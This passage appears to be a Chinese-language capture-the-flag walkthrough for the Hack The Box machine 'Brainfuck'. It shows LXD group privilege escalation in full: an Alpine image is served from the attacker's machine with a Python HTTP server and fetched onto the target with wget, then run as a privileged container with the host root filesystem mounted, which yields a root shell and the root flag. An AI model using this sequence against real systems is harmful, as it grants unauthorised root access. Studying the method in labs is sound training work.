(23/25) Installing musl-utils (1.2.3-r4) (24/25) Installing libc-utils (0.7.2-r3) (25/25) Installing alpine-base (3.17.1-r0) Executing busybox-1.35.0-r29.trigger OK: 10 MiB in 25 packages ┌──(root㉿kali)-[~/Desktop] └─# ls alpine-v3.17-x86_64-20230119_1539.tar.gz 多了一个压缩文件 Step 3使用 python3 开启一个 http 服务 python3 -m http.server 80 Step 4在靶机中使用 wget 下载，然后运行 orestis@brainfuck:~$ wget http://10.10.16.11/alpine-v3.17-x86_64-20230119_1539.tar.gz --2023-01-19 09:41:24-- http://10.10.16.11/alpine-v3.17-x86_64-20230119_1539.tar.gz Connecting to 10.10.16.11:80... connected. HTTP request sent, awaiting response... 200 OK Length: 3792999 (3.6M) [application/gzip] Saving to: ‘alpine-v3.17-x86_64-20230119_1539.tar.gz’ alpine-v3.17-x86_64-20230119_1539.tar.gz 100%[=====================================================================================================================&gt;] 3.62M 810KB/s in 11s 2023-01-19 09:41:37 (328 KB/s) - ‘alpine-v3.17-x86_64-20230119_1539.tar.gz’ saved [3792999/3792999] orestis@brainfuck:~$ lxc image import alpine-v3.17-x86_64-20230119_1539.tar.gz --alias test Generating a client certificate. This may take a minute... If this is your first time using LXD, you should also run: sudo lxd init To start your first container, try: lxc launch ubuntu:16.04 Image imported with fingerprint: 2f15d7d049eb4ce507a0ec903b690f37e78c2166c9d6fd062dbfed81b3816467 orestis@brainfuck:~$ lxc image list +-------+--------------+--------+-------------------------------+--------+--------+------------------------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE | +-------+--------------+--------+-------------------------------+--------+--------+------------------------------+ | test | 2f15d7d049eb | no | alpine v3.17 (20230119_15:39) | x86_64 | 3.62MB | Jan 19, 2023 at 7:43am (UTC) | +-------+--------------+--------+-------------------------------+--------+--------+------------------------------+ 已经运行成功了，咱们去继续利用 lxc init test test -c security.privileged=true # 初始化镜像 lxc config device add test test disk source=/ path=/mnt/root recursive=true # 挂载磁盘 lxc start test # 启动镜像 lxc exec test /bin/sh # 进入镜像 orestis@brainfuck:~$ lxc exec test /bin/sh ~ # whoami&amp;&amp;id root uid=0(root) gid=0(root) 成功拿到 root 权限 ~ # cat /mnt/root/root/root.txt 6efc1a5dbb8904751ce6566a305bb8ef 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]}],"categories":[{"name":"学习记录","slug":"学习记录","permalink":"http://www.lucifiel.com/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"}],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"},{"name":"TryHackMe","slug":"TryHackMe","permalink":"http://www.lucifiel.com/tags/TryHackMe/"},{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://www.lucifiel.com/tags/Vulnhub/"}]}